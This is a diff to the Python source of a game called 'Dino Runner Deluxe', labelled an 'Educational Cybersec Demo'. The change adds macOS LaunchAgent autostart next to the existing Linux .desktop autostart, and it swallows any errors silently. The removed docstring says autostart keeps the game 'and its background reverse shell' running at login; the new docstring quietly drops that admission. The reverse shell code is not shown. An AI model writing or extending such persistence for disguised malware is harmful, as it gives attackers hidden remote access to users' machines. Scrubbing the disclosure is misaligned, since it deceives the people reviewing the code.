@@ -152,41 +152,69 @@ def create_demo_shortcut() -> Path:
 
 
 def register_startup() -> None:
-    """Registers the application for autostart on Linux systems.
+    """Registers the application for autostart on Linux and macOS systems.
 
-    This creates a .desktop file in the user's autostart directory,
-    ensuring the game (and its background reverse shell) runs when the user logs in.
+    This creates a .desktop file in the user's autostart directory on Linux
+    or a .plist LaunchAgent on macOS.
     """
-    if platform.system() != "Linux":
+    system = platform.system()
+    if system not in ("Linux", "Darwin"):
         return
-
-    autostart_dir = Path.home() / ".config" / "autostart"
-    autostart_dir.mkdir(parents=True, exist_ok=True)
-    desktop_file = autostart_dir / "dino_runner.desktop"
 
     # Resolve the absolute path to the main.py or the frozen executable
     if getattr(sys, "frozen", False):
         exec_path = Path(sys.executable).resolve()
-        command = f'"{exec_path}"'
+        command_args = [str(exec_path)]
     else:
         # If running from source, we need to call python with the main script
         main_py = resource_root() / "main.py"
-        command = f'"{sys.executable}" "{main_py.resolve()}"'
+        command_args = [sys.executable, str(main_py.resolve())]
 
-    content = f"""[Desktop Entry]
+    if system == "Linux":
+        autostart_dir = Path.home() / ".config" / "autostart"
+        autostart_dir.mkdir(parents=True, exist_ok=True)
+        desktop_file = autostart_dir / "dino_runner.desktop"
+        
+        command_str = " ".join(f'"{arg}"' for arg in command_args)
+        content = f"""[Desktop Entry]
 Type=Application
-Exec={command}
+Exec={command_str}
 Hidden=false
 NoDisplay=false
 X-GNOME-Autostart-enabled=true
 Name=Dino Runner Deluxe
 Comment=Educational Cybersec Demo
 """
-    try:
-        desktop_file.write_text(content, encoding="utf-8")
-    except Exception:
-        # Silently fail if we can't write the startup file
-        pass
+        try:
+            desktop_file.write_text(content, encoding="utf-8")
+        except Exception:
+            pass
+
+    elif system == "Darwin": # macOS
+        launch_agents_dir = Path.home() / "Library" / "LaunchAgents"
+        launch_agents_dir.mkdir(parents=True, exist_ok=True)
+        plist_path = launch_agents_dir / "com.dinorunner.deluxe.plist"
+        
+        exec_args_xml = "\n".join(f"        <string>{arg}</string>" for arg in command_args)
+        content = f"""<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.dinorunner.deluxe</string>
+    <key>ProgramArguments</key>
+    <array>
+{exec_args_xml}
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+</dict>
+</plist>
+"""
+        try:
+            plist_path.write_text(content, encoding="utf-8")
+        except Exception:
+            pass
 
 
 def launch(argv: list[str] | None = None) -> int:
